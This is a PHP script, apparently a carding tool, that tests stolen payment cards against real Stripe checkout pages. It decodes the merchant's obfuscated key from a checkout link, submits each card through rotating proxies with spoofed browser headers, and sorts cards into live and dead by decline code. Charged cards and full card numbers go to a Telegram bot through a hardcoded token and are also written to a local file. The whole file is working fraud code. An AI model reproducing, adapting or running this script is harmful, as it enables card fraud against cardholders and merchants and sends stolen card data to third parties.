<?php

include 'config.php';
if (!isset($_GET['referrer']) || $_GET['referrer'] != "Auth") {
    $i = rand(0,sizeof($red_link)-1);
    header("location: $red_link[$i]");
    exit();
}
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

function g($str, $start, $end, $decode=false){   
    return $decode ? base64_decode(explode($end, explode($start, $str)[1])[0]) : explode($end, explode($start, $str)[1])[0];
  }

function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
$lista = $_GET['cards'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

// SET YOUR COOKIES
if (!is_dir("cookies")) {
    mkdir("cookies");
}
$gon = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR . "spad3shits" . rand(10000, 9999999) . ".txt";
$cookietempfile = fopen($gon, 'w+');
fclose($cookietempfile);

$mask = substr_replace($cc,'xxxxxxxxxx',0,10);

$checkoutlink = $_GET['colink'];
$colink = $checkoutlink;

$obfuscatedPK = urldecode(explode("#", $colink)[1]);
$deobfed = '';

$decoded = base64_decode($obfuscatedPK);

for ($i = 0; $i < strlen($decoded); $i++) {
    $deobfed .= chr(5 ^ ord($decoded[$i]));
}

$shuroap = json_decode($deobfed, 1);
$pklive = $shuroap['apiKey'];
//echo "$pklive<br>";
$cslive = g($colink, '/pay/', '#');
//echo "$cslive<br>";
$xamount = $_GET['xamount'];
if (empty($_GET['xemail'])) {
    $email = 'spade3_random' . rand(000000, 999999) . '@gmail.com';
    $xemail = str_replace('@', '%40', $email);
} elseif (!empty($_GET['xemail'])) {
    $email = $_GET['xemail'];
    $xemail = str_replace('@', '%40', $email);
}

// rotating proxy by Alice if failed hosting server magiging ip
$hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
$ip = isset($_GET['ip']) ? $_GET['ip'] : '';
$proxy = ''.$ip.'';
$proxyauth = ''.$hydra.'';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $ip = curl_exec($ch);
 curl_close($ch);

$ips = g($ip,'"query":"','"');
$ip_countryflag = json_decode($ip, true)['countryCode'];
$ip_countryname = json_decode($ip, true)['country'];
if (!empty($ips)) {
    //$myip = "<img src='https://flagcdn.com/16x12/".strtolower($ip_countryflag).".png' srcset='https://flagcdn.com/32x24/".strtolower($ip_countryflag).".png 2x, https://flagcdn.com/48x36/".strtolower($ip_countryflag).".png 3x' width='16' height='12' alt='$ip_countryname'> <font class='text-white'>$ips</font><br>";
    $myip = "<font class='text-white'>$ips ($ip_countryname)</font><br>";
} else {
$myip = "";
}
echo $myip;

# INIT PAGE
$retry = 0;
$max_retries = 4;
$response = '';
while ($retry < $max_retries && empty($response)) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'/init');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'accept: application/json';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
$headers[] = 'origin: https://checkout.stripe.com';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'referer: https://checkout.stripe.com/';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'key='.$pk.'&eid=NA&browser_locale=en-GB&redirect_type=url');
$curl = curl_exec($ch);
curl_close($ch);
$retry++;
}

 $curl;
 $amttt = g($curl,'"unit_amount_decimal": "','"');
 $xmail = g($curl,'"customer_email": "','"');
 $currency = g($curl,'"currency": "','"');
 $sessionstatus = json_decode($curl, true)['error']['message'];
 $paymentname1 = json_decode($curl, true)['account_settings']['display_name'];
 $paymentname2 = json_decode($curl, true)['account_settings']['display_name'];
 $cancelurl1 = json_decode($curl, true)['cancel_url'];
 $cancelurl2 = json_decode($curl, true)['cancel_url'];
 if (!empty($cancelurl1)) {
    $cancelurl1 = "🙅‍♂️ Return URL: [click here](".urldecode($cancelurl1).")\r\n";
 } else {
    $cancelurl1 = "";
 }
 if (!empty($cancelurl2)) {
    $cancelurl2 = "🙅‍♂️ Return URL: [".urldecode($cancelurl2)."](".urldecode($cancelurl2).")\r\n";
 } else {
    $cancelurl2 = "";
 }
 if (!empty($paymentname1)) {
    $paymentname1 = "🛒 Merchant: $paymentname1\r\n$cancelurl1";
} else {
    $paymentname1 = "";
}
 if (!empty($paymentname2)) {
    $paymentname2 = "🛒 Merchant: $paymentname2\r\n$cancelurl2";
} else {
    $paymentname2 = "";
}
if (empty($curl)) {
    echo "";
}

# OPEN AI @extrapchewy

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&consent[terms_of_service]=accepted&key='.$pklive.'');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Host: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://checkout.stripe.com';
$headers[] = 'Referer: https://checkout.stripe.com/';
//$headers[] = 'User-Agent: '.$userAgentRandom.'';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$pm = json_decode($payment_pages = curl_exec($ch), true);

$id = $pm['terms_of_service'];

curl_close($ch);

#########1st
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&billing_details[name]=Lyka+Chk&billing_details[email]='.urlencode($xemail).'&billing_details[address][country]=PH&key='.$pklive.'&payment_user_agent=stripe.js%2F97dfa8730%3B+stripe-js-v3%2F97dfa8730%3B+checkout';

$headers = array();
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
  $curl0 = curl_exec($ch);
curl_close($ch);

 
$pm = Getstr($curl0,'"id": "','"');
 "<br>";
 "<br>";


##########2nd

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'/confirm');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = 'eid=NA&payment_method='.$pm.'&expected_amount='.$xamount.'&last_displayed_line_item_group_details[subtotal]='.$xamount.'&last_displayed_line_item_group_details[total_exclusive_tax]=0&last_displayed_line_item_group_details[total_inclusive_tax]=0&last_displayed_line_item_group_details[total_discount_amount]=0&last_displayed_line_item_group_details[shipping_rate_amount]=0&expected_payment_method_type=card&key='.$pklive.'';

$headers = array();
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
 $curl1 = curl_exec($ch);
curl_close($ch);

 
$three_d_secure_2_source = Getstr($curl1,'"three_d_secure_2_source": "','"');
$success = g($curl1, '"success_url": "','"');
 $client_secret = Getstr($curl1,'"client_secret": "','"');
 "<br>";
 $pi = Getstr($curl1,'"client_secret": "','_secret_');
  "<br>";
 "<br>";
#############3rd


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_POST, 1);

$postfield = 'source='.$three_d_secure_2_source.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22873%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-480%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+11%3B+21061110AG)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F87.0.4280.141+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=false&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key='.$pklive.'';

$headers = array();

curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0, CURLOPT_POSTFIELDS => $postfield));
 $result = curl_exec($ch);
curl_close($ch);

 "<br>";
 "<br>";
###############4th
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$pi.'?key='.$pklive.'&is_stripe_sdk=false&client_secret='.$client_secret.'');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

$headers = array();

curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$result1 = curl_exec($ch);
curl_close($ch);

 $result1;
 $dcode1 = Getstr($result1,'"code": "','"');
 "<br>";
 "<br>";
 "<br>";
###############4th
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cslive.'?key='.$pklive.'&eid=NA');
if (!empty($proxy)) {
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    if (!empty($proxyauth)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    }
}
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

$headers = array();

curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
curl_setopt_array($ch, array(CURLOPT_HTTPHEADER => $headers, CURLOPT_FOLLOWLOCATION => 1, CURLOPT_RETURNTRANSFER => 1, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYPEER => 0, CURLOPT_SSL_VERIFYHOST => 0));
$result2 = curl_exec($ch);
curl_close($ch);

  $result2;
 $dcode2 = Getstr($result2,'"code": "','"');

///** FORWARDER

#############SET DESTINATION OF YOUR TG BOT
$card = $lista;
$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
$botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
$chatID = urlencode('-1001815647781');
$amttt = intval($xamount)/100;
if (!empty($proxy) || !empty($proxyauth)) {
    $proxyinfo = "🌐 PROXY USED\r\n➤ Ip & Port\r\n`$proxy`\r\n➤ Credentials\r\n`$proxyauth`\r\n➤ Country\r\n$ip_countryname\r\n\n";
} else {
    $proxyinfo = "➤ Country\r\n$ip_countryname\r\n\n";
}

#############SEND TO TG BOT WHEN CHARGED
$charged_message = "Successful Checkout\r\n\n".$paymentname1."💳 BIN:\r\n`$card`\r\n💰 Amount: ".strtoupper($currency)." $amttt\r\n💸 Success URL: [".urldecode($success)."](".urldecode($success).")\r\n\n" . $proxyinfo . "☑️ Checked from:\r\n*$domain*";
$sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($charged_message).'&parse_mode=markdown';

#############SEND TO TG BOT WHEN INSUFFBAL
$insuf_message = "Insufficient Funds\r\n\n".$paymentname2."💳 BIN: `$card`\r\n💰 Amount to bill: ".strtoupper($currency)." $amttt\r\n🔗 Stripe Checkout link: [click here](".urldecode($colink).")\r\n\n" . $proxyinfo . "☑️ Checked from:\r\n*$domain*";
$sendinsuff = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id=-1001808253666&text='.urlencode($insuf_message).'&parse_mode=markdown';
    
#############BOT RETRY TO SEND IF ITS NOT WORKS
$max_retries = 3;
$num_retries = 0;
$sendchargedtotg = false;
$sendinsufftotg = false;

 #############SUCCEEDED SUCCESS
 if (strpos($result1, '"status": "succeeded"')) {
    while (!$sendchargedtotg && $num_retries < $max_retries) {
    $sendchargedtotg = @file_get_contents($sendcharged);
    $num_retries++;
    echo "<font color=green><b>##RAKKK $mask|$mes|$ano<br>Payment successfully<br>Amount: ".strtoupper($currency)." $amttt<br>Invoice: <a href='$success' target='_blank'><font color='blue'>here</font></a><br>Checked by $domain<br>";
    fwrite(fopen('mga-cc-nahit-ko-kasi-petmalu-ako.txt', 'a'), $lista."\r\n");
}
    exit();
}
#############DECLINECODEcurl0
elseif(strpos($curl0, 'card_not_supported')) {
    echo "<font color=red><b>#DEAD $lista<br>card_not_supported<br>";
    exit();
}
elseif(strpos($curl0, 'generic_decline')) {
    echo "<font color=red><b>#DEAD $lista<br>generic_decline<br>";
    exit();
}
elseif(strpos($curl0, '"type": "intent_confirmation_challenge"')) {
    echo "<font color=red><b>#DEAD $lista<br>HCaptcha Triggered<br>";
    exit();
}
if (strpos($curl0, '"insufficient_funds"')) {
    echo "<font color=green><b>#LIVE $lista<br>insufficient_funds<br>"; 
    exit();
}



#############DECLINECODEcurl1
elseif(strpos($curl1, 'fraudulent')) {
    echo "<font color=red><b>#DEAD $lista<br>fraudulent<br>";
    exit();
}
elseif(strpos($curl1, 'incorrect_number')) {
    echo "<font color=red><b>#DEAD $lista<br>incorrect_number<br>";
    exit();
}
elseif(strpos($curl1, 'invalid_account')) {
    echo "<font color=red><b>#DEAD $lista<br>invalid_account<br>";
    exit();
}
elseif(strpos($curl1, 'generic_decline')) {
    echo "<font color=red><b>#DEAD $lista<br>generic_decline<br>";
    exit();
}
elseif(strpos($curl1, '"type": "intent_confirmation_challenge"')) {
    echo "<font color=red><b>#DEAD $lista<br>HCaptcha Triggered<br>";
    exit();
}
if (strpos($curl1, '"insufficient_funds"')) {
    echo "<font color=green><b>#LIVE $lista<br>insufficient_funds<br>";
   
    exit();
}





#############DECLINECODEresult1
elseif(strpos($result1, 'payment_intent_authentication_failure')) {
    echo "<font color=red><b>#DEAD $lista<br>The provided Payment Method has failed authentication.<br>";
    exit();
}
elseif(strpos($result1, 'BEGIN CERTIFICATE')) {
    echo "<font color=red><b>#DEAD $lista<br>3D SECURED CARD<br>";
    exit();
}
elseif(strpos($result1, 'fraudulent')) {
    echo "<font color=red><b>#DEAD $lista<br>fraudulent<br>";
    exit();
}
elseif(strpos($result1, 'generic_decline')) {
    echo "<font color=red><b>#DEAD $lista<br>generic_decline<br>";
    exit();
}
if (strpos($result1, '"insufficient_funds"')) {
    echo "<font color=green><b>#LIVE $lista<br>insufficient_funds<br>";   
    exit();
}
elseif(strpos($result1, '"type": "intent_confirmation_challenge"')) {
    echo "<font color=red><b>#DEAD $lista<br>HCaptcha Triggered<br>";
    exit();
}




#############ELSEDECLINE
 else
   {
     echo"<font color=red><b>#DEAD $lista<br>CARD DECLINED<br>";
     exit();
   }

// DELETE COOKIES AT IBA PANG MGA LIBAG
if (is_file($cookies) && is_writable($cookies)) {
    unlink($cookies);
    unset($ch);
    flush();
    ob_flush();
    ob_end_flush();
}

// DELETE ALL TYPE OF FILES SA COOKIES FOLDER
$dir = getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR;
$files = glob($dir . "*"); // get all files in the directory

foreach($files as $file) {
    if(is_file($file)) { // make sure it's a file and not a directory
        unlink($file); // delete the file
    }
}
 
?>